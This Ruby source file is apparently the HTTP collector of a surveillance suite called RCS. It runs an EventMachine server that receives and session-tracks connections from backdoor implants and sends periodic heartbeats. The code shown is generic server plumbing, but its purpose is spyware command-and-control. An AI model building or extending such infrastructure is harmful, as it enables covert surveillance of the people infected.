#
#  Event handlers
#

# relatives
require_relative 'heartbeat.rb'
require_relative 'parser.rb'
require_relative 'network_controller.rb'
require_relative 'sessions.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/status'

# system
require 'eventmachine'
require 'evma_httpserver'
require 'socket'

module RCS
module Collector

class HTTPHandler < EM::Connection
  include RCS::Tracer
  include EM::HttpServer
  include RCS::Collector::Parser

  attr_reader :peer
  attr_reader :peer_port

  def post_init
    # don't forget to call super here !
    super

    # timeout on the socket
    set_comm_inactivity_timeout 30

    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings

    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024

    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    @network_peer = @peer
    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
  end

  def unbind
    trace :debug, "Connection closed #{@network_peer}:#{@peer_port}"
  end

  def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    trace :info, "[#{@peer}] Incoming HTTP Connection"
    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"

    # remove the name of the cookie.
    # the session manager will handle only the value of the cookie
    @http_cookie.gsub!(/ID=/, '') if @http_cookie

    resp = EM::DelegatedHttpResponse.new(self)

    # Block which fulfills the request
    operation = proc do

      # do the dirty job :)
      # here we pass the control to the internal parser which will return:
      #   - the content of the reply
      #   - the content_type
      #   - the cookie if the backdoor successfully passed the auth phase
      begin
        content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
      rescue Exception => e
        trace :error, "ERROR: " + e.message
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end

      # prepare the HTTP response
      resp.status = 200
      resp.status_string = Net::HTTPResponse::CODE_TO_OBJ["#{resp.status}"].name.gsub(/Net::HTTP/, '')
      resp.content = content
      resp.headers['Content-Type'] = content_type
      # insert a name for the cookie to be RFC compliant
      resp.headers['Set-Cookie'] = "ID=" + cookie unless cookie.nil?

      if @http_headers.split("\x00").index {|h| h['Connection: keep-alive'] || h['Connection: Keep-Alive']} then
        # keep the connection open to allow multiple requests on the same connection
        # this will increase the speed of sync since it decrease the latency on the net
        resp.keep_connection_open true
        resp.headers['Connection'] = 'keep-alive'
      else
        resp.headers['Connection'] = 'close'
      end

    end

    # Callback block to execute once the request is fulfilled
    callback = proc do |res|
    	resp.send_response
      trace :info, "[#{@peer}] HTTP Connection completed"
    end

    # Let the thread pool handle request
    EM.defer(operation, callback)
  end

end #HTTPHandler

class Events
  include RCS::Tracer
  
  def setup(port = 80)

    # main EventMachine loop
    begin
      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll

        # set the thread pool size
        EM.threadpool_size = 50

        # we are alive and ready to party
        Status.my_status = Status::OK

        # start the HTTP server
        if Config.global['COLL_ENABLED'] then
          EM::start_server("0.0.0.0", port, HTTPHandler)
          trace :info, "Listening on port #{port}..."

          # send the first heartbeat to the db, we are alive and want to notify the db immediately
          # subsequent heartbeats will be sent every HB_INTERVAL
          HeartBeat.perform

          # set up the heartbeat (the interval is in the config)
          EM::PeriodicTimer.new(Config.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }

          # timeout for the sessions (will destroy inactive sessions)
          EM::PeriodicTimer.new(60) { SessionManager.timeout }
        end

        # set up the network checks (the interval is in the config)
        if Config.global['NC_ENABLED'] then
          # first heartbeat and checks
          EM.defer(proc{ NetworkController.check })
          # subsequent checks
          EM::PeriodicTimer.new(Config.global['NC_INTERVAL']) { EM.defer(proc{ NetworkController.check }) }
        end

      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{port}"
        return 1
      end
      raise
    end

  end

end #Events

end #Collector::
end #RCS::

